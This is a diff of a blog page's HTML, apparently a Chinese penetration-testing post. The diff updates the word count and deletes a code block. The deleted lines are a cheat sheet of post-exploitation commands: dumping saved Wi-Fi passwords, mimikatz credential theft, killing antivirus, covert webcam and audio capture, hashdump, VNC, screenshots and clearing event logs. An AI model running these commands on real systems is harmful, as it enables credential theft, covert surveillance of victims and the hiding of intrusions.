@@ -51,7 +51,7 @@
 
 <meta itemprop="datePublished" content="2018-01-07T18:04:56&#43;00:00" />
 <meta itemprop="dateModified" content="2018-01-07T18:04:56&#43;00:00" />
-<meta itemprop="wordCount" content="2544">
+<meta itemprop="wordCount" content="2362">
 
 
 
@@ -820,36 +820,7 @@ exploit</pre></td></tr></table>
 </div>
 </div>
 <p><img src="https://img.04z.net/img/evi1ox_2018-04-26_18-38-24.jpg" alt="" /></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">好久没玩都快忘光了,一些命令再记下...
-for /f &#34;skip=9 tokens=1,2 delims=:&#34; %i in (&#39;netsh wlan show profiles&#39;) do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear //无线密码
-load mimikatz &amp;&amp; wdigest //抓取明文密码
-bgrun killav //杀掉杀毒软件
-webcam_list //查看有没有摄像头
-bgrun webcam //启动摄像头
-webcam_snap -i 1 -v false //启动摄像头拍摄一张照片但不打开闪光灯
-bgrun sound_recorder //启动声音录制
-bgrun hashdump //获取哈希值
-bgrun vnc //启动vnc连接
-screenshot //对目标系统桌面进行截屏
-clearev //清除日志</pre></td></tr></table>
-</div>
-</div>
+
     </div>
 
     
